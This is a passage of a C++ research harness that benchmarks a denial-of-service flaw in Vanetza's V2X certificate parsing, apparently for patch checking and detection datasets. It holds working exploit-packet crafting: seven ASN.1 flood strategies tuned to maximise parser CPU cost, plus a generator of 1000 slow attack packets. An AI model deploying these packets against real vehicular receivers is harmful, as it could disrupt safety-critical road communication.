#include "router_fuzzing_context.hpp"
#include "pre_filter.hpp"
#include <iostream>
#include <fstream>
#include <chrono>
#include <vector>
#include <string>
#include <cstdlib>
#include <cstdio>
#include <climits>   // LLONG_MAX
#include <iomanip>   // std::hex, std::setw, std::setfill, std::fixed, std::setprecision
#include <algorithm>
#include <dirent.h>
#include <sys/stat.h>

const std::string RESET   = "\033[0m";
const std::string GREEN   = "\033[32m";
const std::string RED     = "\033[31m";
const std::string YELLOW  = "\033[33m";
const std::string BLUE    = "\033[34m";


// ================================================
// File I/O
// ================================================

vanetza::ByteBuffer readFileIntoBuffer(const std::string& filename) {
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return {};
    const std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    vanetza::ByteBuffer buffer(size);
    file.read(reinterpret_cast<char*>(buffer.data()), size);
    return buffer;
}

bool writeBufferToFile(const std::string& filename, const vanetza::ByteBuffer& buf) {
    std::ofstream file(filename, std::ios::binary);
    if (!file.is_open()) return false;
    file.write(reinterpret_cast<const char*>(buf.data()), buf.size());
    return file.good();
}

// ================================================
// Dataset folder scanning
// ================================================

std::vector<vanetza::ByteBuffer> loadPacketsFromFolder(const std::string& folder) {
    std::vector<vanetza::ByteBuffer> packets;
    DIR* dir = opendir(folder.c_str());
    if (!dir) return packets;

    struct dirent* entry;
    std::vector<std::string> filenames;
    while ((entry = readdir(dir)) != nullptr) {
        std::string name = entry->d_name;
        if (name == "." || name == "..") continue;
        filenames.push_back(folder + "/" + name);
    }
    closedir(dir);

    std::sort(filenames.begin(), filenames.end());
    for (const auto& path : filenames) {
        auto buf = readFileIntoBuffer(path);
        if (!buf.empty()) {
            packets.push_back(buf);
        }
    }
    return packets;
}

// ================================================
// Attack packet generation
// Keep GeoNetworking + BTP header intact (first 16 bytes)
// so Vanetza does not reject at header parse stage
// Randomize only payload region for diversity
// ================================================

vanetza::ByteBuffer craftAttackPacket(const vanetza::ByteBuffer& poc_packet,
                                       unsigned int seed) {
    vanetza::ByteBuffer attack = poc_packet;  // start from real exploit
    srand(seed);

    // PRESERVE bytes 0-63 exactly — this is the ASN.1 header that
    // triggers Vanetza's deep certificate parsing (the exploit trigger)
    // Only mutate the flood region (byte 64 onward)
    // The flood byte in poc is 0x02 — vary it slightly so packets differ
    // but still cause deep stack allocation

    if (attack.size() <= 64) return attack;

    // Pick a flood byte close to 0x02 — stays in ASN.1 integer tag range
    // so Vanetza keeps parsing deeply instead of rejecting early
    const uint8_t flood_candidates[] = {0x02, 0x01, 0x03, 0x04};
    uint8_t flood_byte = flood_candidates[rand() % 4];

    // Vary flood length slightly — keep it large enough to stress the parser
    // poc is 353 bytes total, flood starts at 64, so flood length = 289
    // vary by ±20 bytes so packet sizes differ
    int variation = (rand() % 41) - 20;  // -20 to +20
    size_t flood_end = attack.size() + variation;

    // Resize if making longer
    if (flood_end > attack.size()) {
        attack.resize(flood_end, flood_byte);
    }

    // Fill flood region with chosen byte
    for (size_t i = 64; i < std::min(flood_end, attack.size()); ++i) {
        attack[i] = flood_byte;
    }

    return attack;
}

// ================================================
// Validate packet through Vanetza & Measure Latency
// Returns the latency in nanoseconds. Returns -1 if it crashes/throws.
// ================================================

long long measurePacketLatency(const vanetza::ByteBuffer& buf) {
    try {
        vanetza::RouterFuzzingContext ctx;
        vanetza::ByteBuffer copy = buf;
        
        auto start = std::chrono::high_resolution_clock::now();
        ctx.indicate(std::move(copy));
        auto end = std::chrono::high_resolution_clock::now();
        
        return std::chrono::duration_cast<std::chrono::nanoseconds>(end - start).count();
    } catch (...) {
        return -1; // Parse error or crash
    }
}

void runFloodDiagnosis(const vanetza::ByteBuffer& poc_packet) {
    fprintf(stdout,
        "\n%s"
        "╔══════════════════════════════════════════════════════════════╗\n"
        "║               FLOOD REGION DIAGNOSIS                        ║\n"
        "╚══════════════════════════════════════════════════════════════╝"
        "%s\n\n", BLUE.c_str(), RESET.c_str());

    const size_t HEADER_SIZE = 64;
    const int    RUNS        = 10000;

    // ── NORMAL vs POC BASELINE ───────────────────────────────────────
    double poc_vs_normal_ratio = 0.0;
    {
        vanetza::ByteBuffer normal_pkt =
            readFileIntoBuffer("input/cam_v3_certificate.dat");

        fprintf(stdout, "%s  NORMAL vs POC BASELINE%s\n",
                YELLOW.c_str(), RESET.c_str());

        struct BLEntry {
            const char*                label;
            const vanetza::ByteBuffer* buf;
            bool                       available;
        };

        BLEntry bl_entries[] = {
            { "NORMAL  cam_v3_certificate.dat", &normal_pkt, !normal_pkt.empty() },
            { "POC     poc_mtu_limit.bin",      &poc_packet, true                },
        };

        long long bl_avg[2] = {};

        for (int e = 0; e < 2; ++e) {
            if (!bl_entries[e].available) {
                fprintf(stdout,
                    "  %s%-44s  [FILE NOT FOUND]%s\n",
                    RED.c_str(), bl_entries[e].label, RESET.c_str());
                continue;
            }

            long long total = 0;
            long long mn = LLONG_MAX, mx = 0;
            int valid = 0, crashed = 0;

            for (int r = 0; r < RUNS; ++r) {
                long long lat = measurePacketLatency(*bl_entries[e].buf);
                fprintf(stdout,
                    "\r  [%-44s]  run %5d/%d  ok=%-5d  crash=%-3d  last=%8lld ns     ",
                    bl_entries[e].label, r + 1, RUNS, valid, crashed,
                    lat > 0 ? lat : 0LL);
                fflush(stdout);
                if (lat > 0) {
                    total += lat; valid++;
                    mn = std::min(mn, lat);
                    mx = std::max(mx, lat);
                } else {
                    crashed++;
                }
            }
            fprintf(stdout, "\r%80s\r", "");

            long long avg = valid > 0 ? total / valid : 0;
            bl_avg[e] = avg;

            fprintf(stdout,
                "  %-44s  avg=%8lld ns  min=%8lld ns  max=%8lld ns  valid=%d/%d\n",
                bl_entries[e].label, avg,
                (valid > 0 ? mn : 0LL), (valid > 0 ? mx : 0LL),
                valid, RUNS);
        }

        if (bl_avg[0] > 0 && bl_avg[1] > 0) {
            poc_vs_normal_ratio = static_cast<double>(bl_avg[1]) / bl_avg[0];
            const char* ratio_color =
                (poc_vs_normal_ratio < 2.0)  ? GREEN.c_str()  :
                (poc_vs_normal_ratio < 10.0) ? YELLOW.c_str() : RED.c_str();

            fprintf(stdout,
                "  %-44s  %sx%.2f%s  (POC costs %.1fx more CPU than NORMAL)\n\n",
                "POC / NORMAL ratio:",
                ratio_color, poc_vs_normal_ratio, RESET.c_str(), poc_vs_normal_ratio);

            if (poc_vs_normal_ratio < 2.0) {
                fprintf(stdout,
                    "  %s[NOTE] POC/Normal ratio < 2.0 — patch likely active at this packet size.%s\n"
                    "  Flood content diagnosis below may not be meaningful.\n\n",
                    GREEN.c_str(), RESET.c_str());
            }
        }

        fprintf(stdout, "  %s%s%s\n\n",
                BLUE.c_str(),
                "──────────────────────────────────────────────────────────────",
                RESET.c_str());
    }
    // ── BASELINE END ─────────────────────────────────────────────────

    // Variant A: original poc (0x02 flood)
    vanetza::ByteBuffer var_02 = poc_packet;

    // Variant B: flood replaced with 0x00
    vanetza::ByteBuffer var_00 = poc_packet;
    for (size_t i = HEADER_SIZE; i < var_00.size(); ++i)
        var_00[i] = 0x00;

    // Variant C: header only, no flood bytes at all
    vanetza::ByteBuffer var_hdr(poc_packet.begin(),
                                poc_packet.begin() + std::min(HEADER_SIZE, poc_packet.size()));

    // Variant D: header + single 0x02 byte
    vanetza::ByteBuffer var_min = var_hdr;
    var_min.push_back(0x02);

    struct Variant { const char* label; const vanetza::ByteBuffer* buf; };
    Variant variants[] = {
        { "A: original  (0x02 flood, 353B)", &var_02  },
        { "B: zero flood (0x00 flood, 353B)", &var_00  },
        { "C: header only           (64B)",   &var_hdr },
        { "D: header + 1 byte       (65B)",   &var_min },
    };

    long long results[4] = {};

    for (int v = 0; v < 4; ++v) {
        long long total = 0;
        long long mn = LLONG_MAX, mx = 0;
        int valid = 0, crashed = 0;

        for (int r = 0; r < RUNS; ++r) {
            long long lat = measurePacketLatency(*variants[v].buf);
            fprintf(stdout, "\r  [%s]  run %2d/%d  ok=%-2d  crash=%-2d  last=%7lld ns     ",
                    variants[v].label, r + 1, RUNS, valid, crashed,
                    lat > 0 ? lat : 0LL);
            fflush(stdout);
            if (lat > 0) {
                total += lat; valid++;
                mn = std::min(mn, lat);
                mx = std::max(mx, lat);
            } else {
                crashed++;
            }
        }
        fprintf(stdout, "\r%80s\r", "");

        long long avg = valid > 0 ? total / valid : 0;
        results[v] = avg;

        const char* color = (v == 0) ? BLUE.c_str() : GREEN.c_str();
        fprintf(stdout,
            "  %s%-42s%s  avg=%8lld ns  min=%8lld ns  max=%8lld ns  valid=%d/%d\n",
            color, variants[v].label, RESET.c_str(),
            avg, (valid > 0 ? mn : 0LL), (valid > 0 ? mx : 0LL),
            valid, RUNS);
    }

    fprintf(stdout, "\n");

    // Interpretation
    long long diff_02_vs_00  = results[0] - results[1];
    long long diff_02_vs_hdr = results[0] - results[2];
    double    pct_flood_contrib = results[0] > 0
        ? 100.0 * diff_02_vs_00 / results[0] : 0.0;

    fprintf(stdout, "%s  INTERPRETATION%s\n", YELLOW.c_str(), RESET.c_str());
    fprintf(stdout, "  A vs B (0x02 vs 0x00 flood) : %+lld ns  (%.1f%% of total latency)\n",
            diff_02_vs_00, pct_flood_contrib);
    fprintf(stdout, "  A vs C (full vs header-only) : %+lld ns\n", diff_02_vs_hdr);

    // ── 先判斷 patch 是否截斷，再給 flood 結論 ───────────────────
    if (poc_vs_normal_ratio > 0.0 && poc_vs_normal_ratio < 2.0) {
        fprintf(stdout,
            "\n  %s[RESULT] Patch is ACTIVE — recursion terminated early.%s\n"
            "  POC/Normal = x%.2f (< 2.0): POC is faster than NORMAL because\n"
            "  depth limiter causes early return before full flood parse.\n"
            "  A/B/C/D latency differences are within noise — flood diagnosis\n"
            "  is NOT meaningful on a patched build.\n"
            "  → Run on unpatched build to measure flood contribution.\n",
            GREEN.c_str(), RESET.c_str(), poc_vs_normal_ratio);
    } else if (std::abs(diff_02_vs_00) < results[0] * 0.05) {
        fprintf(stdout,
            "\n  %s[RESULT] Flood content does NOT affect latency (< 5%% difference).%s\n"
            "  The amplification is driven by the header structure alone (bytes[0-63]).\n"
            "  Claim: header-triggered parser amplification, independent of flood content.\n",
            RED.c_str(), RESET.c_str());
    } else if (diff_02_vs_00 > 0) {
        fprintf(stdout,
            "\n  %s[RESULT] Flood content IS parsed (%.1f%% latency contribution).%s\n"
            "  The amplification scales with flood size -- size sweep data is valid.\n",
            GREEN.c_str(), pct_flood_contrib, RESET.c_str());
    } else {
        fprintf(stdout,
            "\n  %s[RESULT] 0x00 flood is SLOWER than 0x02 flood.%s\n"
            "  Parser may spend more time on null-value fields. Both variants are active.\n",
            YELLOW.c_str(), RESET.c_str());
    }

    fprintf(stdout,
        "\n%s"
        "╔══════════════════════════════════════════════════════════════╗\n"
        "║  Run --profile-amp after this to see full size sweep.        ║\n"
        "╚══════════════════════════════════════════════════════════════╝"
        "%s\n\n", GREEN.c_str(), RESET.c_str());
}

// ================================================
// Amplification Profiler (MTU-Constrained Experiment)
// ================================================

// ================================================
// Amplification Profiler — helpers
// ================================================

struct BaselineResult {
    long long avg_ns;
    long long median_ns;
    long long min_ns;
    long long max_ns;
    int       valid_runs;
    int       crashed_runs;
};

struct ProbeResult {
    long long avg_ns;
    long long median_ns;
    long long min_ns;
    long long max_ns;
    int       valid_runs;
    int       crashed_runs;
    bool      sufficient;
};

// ── Measure repeated latency for any packet buffer ──────────────────────────
BaselineResult measureRepeatedLatency(const vanetza::ByteBuffer& pkt, int runs) {
    BaselineResult r = {0, 0, LLONG_MAX, 0, 0, 0};
    std::vector<long long> samples;
    samples.reserve(runs);

    for (int i = 0; i < runs; i++) {
        long long lat = measurePacketLatency(pkt);
        if (lat > 0) {
            samples.push_back(lat);
            r.min_ns = std::min(r.min_ns, lat);
            r.max_ns = std::max(r.max_ns, lat);
            r.valid_runs++;
        } else {
            r.crashed_runs++;
        }
        fprintf(stdout,
            "\r  [%s]  run %2d/%d  ok=%-2d  crash=%-2d  "
            "last=%7lld ns  running-med=%7lld ns     ",
            pkt.size() <= 400 ? "baseline" : "probing ",
            i + 1, runs, r.valid_runs, r.crashed_runs,
            (lat > 0 ? lat : 0LL),
            (!samples.empty() ? samples[samples.size()/2] : 0LL));
        fflush(stdout);
    }
    fprintf(stdout, "\r%80s\r", "");

    if (samples.empty()) return r;

    // arithmetic mean (kept for reference)
    long long total = 0;
    for (long long s : samples) total += s;
    r.avg_ns = total / (long long)samples.size();

    // median (used as the stable representative value)
    std::sort(samples.begin(), samples.end());
    r.median_ns = samples[samples.size() / 2];

    return r;
}

// ── Print baseline section (normal vs poc) ───────────────────────────────────
// Returns normal avg_ns for ratio calculation; -1 on failure
long long printBaselineSection(const vanetza::ByteBuffer& normal_pkt,
                                const vanetza::ByteBuffer& poc_packet,
                                int runs_per_size,
                                std::ofstream& csv) {
    fprintf(stdout, "%s  NORMAL PACKET BASELINE%s\n", YELLOW.c_str(), RESET.c_str());

    if (normal_pkt.empty()) {
        fprintf(stderr, "%s  [!] input/cam_v3_certificate.dat not found -- skipping%s\n",
                RED.c_str(), RESET.c_str());
        return -1;
    }

    fprintf(stdout, "  %-28s %zu bytes\n", "Normal packet size:", normal_pkt.size());

    BaselineResult norm = measureRepeatedLatency(normal_pkt, runs_per_size);
    if (norm.valid_runs == 0) {
        fprintf(stderr, "%s  [!] Normal packet crashed on all runs%s\n",
                RED.c_str(), RESET.c_str());
        return -1;
    }

    fprintf(stdout,
        "  %-28s median=%-9lld  mean=%-9lld  min=%-9lld  max=%-9lld  valid=%d/%d\n",
        "Normal latency (ns):",
        norm.median_ns, norm.avg_ns, norm.min_ns, norm.max_ns,
        norm.valid_runs, runs_per_size);

    fprintf(stdout, "  %-28s %zu bytes\n", "POC packet size:", poc_packet.size());

    BaselineResult poc = measureRepeatedLatency(poc_packet, runs_per_size);
    if (poc.valid_runs == 0) {
        fprintf(stderr, "%s  [!] POC packet crashed on all runs%s\n",
                RED.c_str(), RESET.c_str());
        return -1;
    }

    // use median for ratio — resistant to outliers
    double ratio = static_cast<double>(poc.median_ns) / norm.median_ns;
    const char* ratio_color = (ratio < 10.0) ? GREEN.c_str()
                            : (ratio < 50.0) ? YELLOW.c_str()
                                             : RED.c_str();

    fprintf(stdout,
        "  %-28s median=%-9lld  mean=%-9lld  min=%-9lld  max=%-9lld  valid=%d/%d\n",
        "POC latency (ns):",
        poc.median_ns, poc.avg_ns, poc.min_ns, poc.max_ns,
        poc.valid_runs, runs_per_size);

    fprintf(stdout,
        "  %-28s %sx%.2f%s  (median-based, POC costs %.1fx more CPU per packet)\n\n",
        "POC / Normal ratio:",
        ratio_color, ratio, RESET.c_str(), ratio);

    csv << "# normal_baseline," << normal_pkt.size() << ","
        << norm.median_ns << "," << norm.avg_ns << ","
        << norm.min_ns << "," << norm.max_ns << "\n";
    csv << "# poc_baseline," << poc_packet.size() << ","
        << poc.median_ns << "," << poc.avg_ns << ","
        << poc.min_ns << "," << poc.max_ns << "\n";
    csv << "# poc_vs_normal_ratio_median," << ratio << "\n";

    // return median as the stable baseline for AMP-Mx calculations
    return norm.median_ns;
}

// ── Constants ─────────────────────────────────────────────────────────────────
static const size_t   MTU_LIMIT          = 1400;   // ITS-G5 802.11p practical MTU
static const double   SIZE_STEP_FACTOR   = 1.10;   // x1.1 → ~15 points within MTU
static const size_t   EXPLOIT_HEADER_SIZE = 64;

// ── Build size steps capped at MTU ────────────────────────────────────────────
std::vector<size_t> buildSizeSteps(size_t poc_size) {
    std::vector<size_t> steps;
    double total = static_cast<double>(poc_size);
    steps.push_back(poc_size);

    while (true) {
        total *= SIZE_STEP_FACTOR;
        size_t t = static_cast<size_t>(total);
        if (t >= MTU_LIMIT) {
            steps.push_back(MTU_LIMIT);
            break;
        }
        steps.push_back(t);
    }
    return steps;
}


// ── Flood strategies to try ────────────────────────────────────────────────
// Each returns a flood buffer of exactly flood_size bytes.
// Strategy goal: maximize time Vanetza spends inside its ASN.1 decoder
// without triggering an early-reject path.
// ──────────────────────────────────────────────────────────────────────────

using FloodStrategy = std::function<vanetza::ByteBuffer(size_t)>;

// Strategy 0: original flat INTEGER tags (baseline — known to work)
vanetza::ByteBuffer floodFlat02(size_t n) {
    return vanetza::ByteBuffer(n, 0x02);
}

// Strategy 1: flat BIT STRING tags
vanetza::ByteBuffer floodFlat03(size_t n) {
    return vanetza::ByteBuffer(n, 0x03);
}

// Strategy 2: flat OCTET STRING tags
vanetza::ByteBuffer floodFlat04(size_t n) {
    return vanetza::ByteBuffer(n, 0x04);
}

// Strategy 3: alternating INTEGER + 1-byte length + zero-value
// Pattern: 02 01 00  02 01 00 ...
// Each triple is a valid DER-encoded integer(0), forces real decode per element
vanetza::ByteBuffer floodValidIntegers(size_t n) {
    vanetza::ByteBuffer buf(n, 0x00);
    for (size_t i = 0; i + 2 < n; i += 3) {
        buf[i]   = 0x02;  // INTEGER tag
        buf[i+1] = 0x01;  // length = 1
        buf[i+2] = 0x00;  // value = 0
    }
    return buf;
}

// Strategy 4: alternating INTEGER + 2-byte length claiming large content
// 02 82 03 E8 [content...] — each INTEGER claims 1000 bytes → deep parse
vanetza::ByteBuffer floodLargeIntegers(size_t n) {
    vanetza::ByteBuffer buf(n, 0x02);
    size_t i = 0;
    while (i + 4 <= n) {
        size_t content = std::min(n - i - 4, static_cast<size_t>(0x3FF));
        buf[i]   = 0x02;
        buf[i+1] = 0x82;
        buf[i+2] = static_cast<uint8_t>((content >> 8) & 0xFF);
        buf[i+3] = static_cast<uint8_t>( content       & 0xFF);
        i += 4 + content;
    }
    return buf;
}

// Strategy 5: SEQUENCE of valid-looking INTEGERs
// 30 82 <len> [02 01 00 repeated...]
vanetza::ByteBuffer floodSequenceOfIntegers(size_t n) {
    vanetza::ByteBuffer buf(n, 0x00);
    if (n < 4) return buf;
    // outer SEQUENCE header
    size_t content_len = n - 4;
    buf[0] = 0x30;
    buf[1] = 0x82;
    buf[2] = static_cast<uint8_t>((content_len >> 8) & 0xFF);
    buf[3] = static_cast<uint8_t>( content_len       & 0xFF);
    // fill content with 02 01 00 triples
    for (size_t i = 4; i + 2 < n; i += 3) {
        buf[i]   = 0x02;
        buf[i+1] = 0x01;
        buf[i+2] = 0x00;
    }
    return buf;
}

// Strategy 6: deeply nested SEQUENCE using only 4-byte headers, no flat fill
// Each header claims exactly the remaining space as its content
vanetza::ByteBuffer floodDeepNested(size_t n) {
    vanetza::ByteBuffer buf(n, 0x00);
    size_t offset = 0;
    while (offset + 4 <= n) {
        size_t remaining = n - offset - 4;
        buf[offset]   = 0x30;
        buf[offset+1] = 0x82;
        buf[offset+2] = static_cast<uint8_t>((remaining >> 8) & 0xFF);
        buf[offset+3] = static_cast<uint8_t>( remaining       & 0xFF);
        offset += 4;
    }
    return buf;
}

std::vector<std::pair<std::string, FloodStrategy>> makeStrategies() {
    return {
        { "flat-0x02 (INTEGER tags)",          floodFlat02            },
        { "flat-0x03 (BIT STRING tags)",       floodFlat03            },
        { "flat-0x04 (OCTET STRING tags)",     floodFlat04            },
        { "valid INTEGER triples 02 01 00",    floodValidIntegers     },
        { "large INTEGER 02 82 xx xx",         floodLargeIntegers     },
        { "SEQUENCE of INTEGER triples",       floodSequenceOfIntegers},
        { "deep nested SEQUENCE headers",      floodDeepNested        },
    };
}

// ── Probe one size: try all strategies, keep best ─────────────────────────────
ProbeResult probeOneSize(const vanetza::ByteBuffer& poc_packet,
                          size_t target_total,
                          size_t exploit_header_size,
                          int runs_per_size,
                          int min_valid_runs,
                          int max_attempts_factor) {
    ProbeResult best = {0, 0, LLONG_MAX, 0, 0, 0, false};
    int best_strategy_idx = -1;

    if (target_total > MTU_LIMIT) return best;

    size_t flood_size = (target_total > exploit_header_size)
                        ? target_total - exploit_header_size : 0;

    auto strategies = makeStrategies();
    int total_attempts = 0;
    int total_rejected = 0;

    for (int si = 0; si < (int)strategies.size(); si++) {
        const auto& [name, fn] = strategies[si];

        vanetza::ByteBuffer test_pkt(exploit_header_size);
        std::copy(poc_packet.begin(),
                  poc_packet.begin() + exploit_header_size,
                  test_pkt.begin());
        vanetza::ByteBuffer flood = fn(flood_size);
        test_pkt.insert(test_pkt.end(), flood.begin(), flood.end());

        std::vector<long long> samples;
        samples.reserve(runs_per_size);
        long long s_min = LLONG_MAX, s_max = 0;
        int valid = 0, crashed = 0;
        const int max_attempts = runs_per_size * max_attempts_factor;
        int attempts = 0;

        while (valid < runs_per_size && attempts < max_attempts) {
            attempts++;
            total_attempts++;
            long long lat = measurePacketLatency(test_pkt);
            if (lat > 0) {
                samples.push_back(lat);
                s_min = std::min(s_min, lat);
                s_max = std::max(s_max, lat);
                valid++;
            } else {
                crashed++;
                total_rejected++;
            }
            fprintf(stdout,
                "\r  [%4zu B | strategy %d/%-d | %-36s]  "
                "ok=%-2d  reject=%-2d  avg=%7lld ns     ",
                target_total, si + 1, (int)strategies.size(), name.c_str(),
                valid, crashed,
                valid > 0 ? samples[samples.size()/2] : 0LL);
            fflush(stdout);
        }

        if (valid < min_valid_runs) {
            total_rejected += valid;
            continue;
        }

        // compute median and mean
        std::sort(samples.begin(), samples.end());
        long long median = samples[samples.size() / 2];
        long long total_lat = 0;
        for (long long s : samples) total_lat += s;
        long long avg = total_lat / valid;

        // keep best by median
        if (!best.sufficient || median > best.median_ns) {
            best.avg_ns       = avg;
            best.median_ns    = median;
            best.min_ns       = s_min;
            best.max_ns       = s_max;
            best.valid_runs   = valid;
            best.crashed_runs = crashed;
            best.sufficient   = true;
            best_strategy_idx = si;
        }
    }

    fprintf(stdout, "\r%80s\r", "");

    if (best.sufficient) {
        double reject_rate = total_attempts > 0
            ? 100.0 * total_rejected / total_attempts : 0.0;
        fprintf(stdout,
            "  [%4zu B]  best=strategy-%d (%s)  reject-rate=%.1f%%\n",
            target_total,
            best_strategy_idx + 1,
            strategies[best_strategy_idx].first.c_str(),
            reject_rate);
    }

    return best;
}

// ── Main orchestrator ─────────────────────────────────────────────────────────
void runAmplificationProfiling(const vanetza::ByteBuffer& poc_packet) {

    const size_t EXPLOIT_HEADER_SIZE = 64;
    const int    RUNS_PER_SIZE       = 10000;
    const int    MIN_VALID_RUNS      = 5;
    const int    MAX_ATTEMPTS_FACTOR = 5;

    fprintf(stdout,
        "\n"
        "%s"
        "╔══════════════════════════════════════════════════════════════╗\n"
        "║          MTU-CONSTRAINED AMPLIFICATION PROFILER              ║\n"
        "╚══════════════════════════════════════════════════════════════╝"
        "%s\n\n",
        BLUE.c_str(), RESET.c_str());

    if (poc_packet.size() < EXPLOIT_HEADER_SIZE) {
        fprintf(stderr, "%s[FATAL] poc_packet too small (need >= %zu bytes)%s\n",
                RED.c_str(), EXPLOIT_HEADER_SIZE, RESET.c_str());
        return;
    }

    size_t poc_flood_size = poc_packet.size() - EXPLOIT_HEADER_SIZE;

    fprintf(stdout, "%s  TARGET PACKET ANATOMY%s\n", YELLOW.c_str(), RESET.c_str());
    fprintf(stdout, "  %-28s %zu bytes\n",  "POC total size:",          poc_packet.size());
    fprintf(stdout, "  %-28s bytes[0-%zu] (immutable)\n",
            "Exploit header zone:", EXPLOIT_HEADER_SIZE - 1);
    fprintf(stdout, "  %-28s %zu bytes\n",  "Flood region (baseline):", poc_flood_size);
    fprintf(stdout, "  %-28s CWE-674 unbounded recursion in certificate chain\n\n",
            "Vulnerability:");

    mkdir("csv_data",  0755);
    mkdir("input-amp", 0755);

    std::ofstream csv("csv_data/amplification_profile.csv");
    csv << "total_size_bytes,flood_size_bytes,median_latency_ns,mean_latency_ns,"
           "min_latency_ns,max_latency_ns,amp_vs_normal,valid_runs,crashed_runs\n";

    // --- Baseline: normal packet (cam_v3_certificate.dat) ---
    vanetza::ByteBuffer normal_pkt = readFileIntoBuffer("input/cam_v3_certificate.dat");
    long long normal_avg = printBaselineSection(normal_pkt, poc_packet, RUNS_PER_SIZE, csv);

    if (normal_avg <= 0) {
        fprintf(stderr, "%s[FATAL] Cannot establish normal packet baseline.%s\n",
                RED.c_str(), RESET.c_str());
        return;
    }

    // normal_avg is the single reference baseline for all AMP-Mx values.
    // AMP-Mx = attack_latency / normal_latency
    // This makes AMP-Mx directly comparable across packet sizes and
    // directly answers: "how many times more CPU does one attack packet cost?"
    long long baseline_latency = normal_avg;

    fprintf(stdout, "  %s%s%s\n\n",
            BLUE.c_str(),
            "──────────────────────────────────────────────────────────────",
            RESET.c_str());

    // --- Size sweep ---
    std::vector<size_t> target_sizes = buildSizeSteps(poc_packet.size());

    fprintf(stdout, "%s  SIZE PROGRESSION  (%zu steps, x%.2f geometric)%s\n  ",
            YELLOW.c_str(), target_sizes.size(), SIZE_STEP_FACTOR, RESET.c_str());
    for (size_t s : target_sizes) fprintf(stdout, "%zu ", s);
    fprintf(stdout, "\n\n");

    fprintf(stdout, "%s  %-8s  %-8s  %-8s  %-12s  %-12s  %-12s  %-12s  %-8s  %-6s%s\n",
            YELLOW.c_str(),
            "SIZE(B)", "FLOOD(B)", "FLOOD-Mx",
            "MEDIAN(ns)", "MEAN(ns)", "MIN(ns)", "MAX(ns)",
            "AMP-Mx", "VALID",
            RESET.c_str());
    fprintf(stdout,
            "  %-8s  %-8s  %-8s  %-12s  %-12s  %-12s  %-12s  %-8s  %-6s\n",
            "--------", "--------", "--------",
            "------------", "------------", "------------", "------------",
            "--------", "------");

    int file_idx = 0;

    for (size_t target_total : target_sizes) {
        size_t flood_size = (target_total > EXPLOIT_HEADER_SIZE)
                            ? target_total - EXPLOIT_HEADER_SIZE : 0;

        ProbeResult pr = probeOneSize(poc_packet, target_total,
                                      EXPLOIT_HEADER_SIZE,
                                      RUNS_PER_SIZE, MIN_VALID_RUNS,
                                      MAX_ATTEMPTS_FACTOR);

        if (!pr.sufficient) {
            fprintf(stdout,
                "%s  %-8zu  %-8zu  %-8s  %-12s  %-12s  %-12s  %-8s  %2d/%-4d  SKIP%s\n",
                RED.c_str(), target_total, flood_size,
                "-", "-", "-", "-", "-",
                pr.valid_runs, RUNS_PER_SIZE,
                RESET.c_str());
            csv << target_total << "," << flood_size
                << ",INSUFFICIENT,,,," << pr.valid_runs << "," << pr.crashed_runs << "\n";
            continue;
        }

        double amp        = static_cast<double>(pr.median_ns) / baseline_latency;
        double flood_mult = poc_flood_size > 0
                            ? static_cast<double>(flood_size) / poc_flood_size
                            : 0.0;

        const char* amp_color = (amp < 5.0)  ? GREEN.c_str()
                              : (amp < 15.0) ? YELLOW.c_str()
                                             :   RED.c_str();

        vanetza::ByteBuffer save_pkt(EXPLOIT_HEADER_SIZE);
        std::copy(poc_packet.begin(), poc_packet.begin() + EXPLOIT_HEADER_SIZE, save_pkt.begin());
        save_pkt.resize(EXPLOIT_HEADER_SIZE + flood_size, 0x02);

        char amp_path[256];
        snprintf(amp_path, sizeof(amp_path),
                 "input-amp/amp_%05d_size%05zu.bin", file_idx++, target_total);
        writeBufferToFile(amp_path, save_pkt);

        fprintf(stdout,
            "  %-8zu  %-8zu  x%-7.2f  %-12lld  %-12lld  %-12lld  %-12lld  "
            "%sx%-7.2f%s  %2d/%-4d\n",
            target_total, flood_size, flood_mult,
            pr.median_ns, pr.avg_ns, pr.min_ns, pr.max_ns,
            amp_color, amp, RESET.c_str(),
            pr.valid_runs, RUNS_PER_SIZE);

        csv << target_total << "," << flood_size << ","
            << pr.median_ns << "," << pr.avg_ns << ","
            << pr.min_ns << "," << pr.max_ns << ","
            << amp << "," << pr.valid_runs << "," << pr.crashed_runs << "\n";
    }

    fprintf(stdout,
        "\n"
        "%s"
        "╔══════════════════════════════════════════════════════════════╗\n"
        "║  SCOPE : MTU-constrained only (<= %4zu B)                    ║\n"
        "║  BASELINE : cam_v3_certificate.dat (legitimate CAM)          ║\n"
        "║  AMP-Mx   : attack_latency / normal_latency                  ║\n"
        "║  CSV   -> csv_data/amplification_profile.csv                 ║\n"
        "║  BINs  -> input-amp/amp_NNNNN_sizeNNNNN.bin                  ║\n"
        "╚══════════════════════════════════════════════════════════════╝"
        "%s\n\n",
        GREEN.c_str(), MTU_LIMIT, RESET.c_str());
}

// ================================================
// Dataset builder
// Generates N_TARGET validated attack variants
// Saves to folder so they can be reused across runs
// ================================================

const int    DATASET_TARGET   = 1000;
const int    MAX_ATTEMPTS     = 100000;
const size_t HEADER_SAFE_ZONE = 16;
const std::string NORMAL_FOLDER = "input";
const std::string ATTACK_FOLDER = "input-malware";

bool buildAttackDataset(const vanetza::ByteBuffer& base_normal,
                        const vanetza::ByteBuffer& poc_packet) { 
    mkdir(ATTACK_FOLDER.c_str(), 0755);

    std::cout << "[*] Profiling base POC packet latency baseline...\n";
    long long poc_total_ns = 0;
    int profile_runs = 10;
    for (int i = 0; i < profile_runs; ++i) {
        long long lat = measurePacketLatency(poc_packet);
        if (lat < 0) {
            std::cerr << "[-] Error: Base POC packet crashed during profiling.\n";
            return false;
        }
        poc_total_ns += lat;
    }
    long long poc_mean_ns = poc_total_ns / profile_runs;
    long long latency_threshold = static_cast<long long>(poc_mean_ns * 0.9); 

    std::cout << "[+] Base POC Mean Latency: " << poc_mean_ns << " ns\n";
    std::cout << "[*] Performance Threshold set to: " << latency_threshold << " ns\n";
    std::cout << "[*] Building attack dataset (Target: " << DATASET_TARGET << " verified SLOW packets)...\n";

    int generated = 0;
    int attempts  = 0;
    int rejected  = 0;

    while (generated < DATASET_TARGET && attempts < MAX_ATTEMPTS) {
        attempts++;

        unsigned int seed = static_cast<unsigned int>(time(nullptr)) ^ (attempts * 2654435761u);
        vanetza::ByteBuffer candidate = craftAttackPacket(poc_packet, seed); 

        long long variant_latency = measurePacketLatency(candidate);

        if (variant_latency >= latency_threshold) {
            char path[256];
            snprintf(path, sizeof(path), "%s/attack_%05d.bin",
                     ATTACK_FOLDER.c_str(), generated);
